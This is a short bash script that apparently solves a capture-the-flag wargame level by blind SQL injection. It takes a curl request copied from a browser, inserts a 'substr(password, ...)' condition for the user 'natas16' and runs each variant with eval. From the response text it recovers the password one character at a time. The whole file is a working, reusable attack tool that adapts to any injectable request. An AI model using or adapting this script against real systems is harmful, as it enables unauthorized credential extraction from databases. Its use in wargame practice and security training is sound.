echo "give the filename of the curl command as copied from firefox network pane"
echo "put a * where sql queries are possible"
filename='test'
t_string='exists'
_curl=$(cat "$filename")
found=''

for i in {1..35};
do
  _break=false
  for next_chr in {a..z} {A..Z} {0..9};
  do
    echo -ne "\r\033[Ktesting $found$next_chr"
    injection="username=\"natas16\" and substr(password, 1, $i)=\"$found$next_chr\""
    new_curl="${_curl/INJECT/$injection}"
    response=$(eval "$new_curl")
    if [[ "$response" == *"$t_string"* ]];
    then
      _break=true
      found="$found$next_chr"
      break
    fi
    #echo "$new_curl"
    #echo "$response"
  done
  if [[ $_break == false ]];
  then
    echo
    break
  fi
  echo -e "\nFOUND: $found"
done
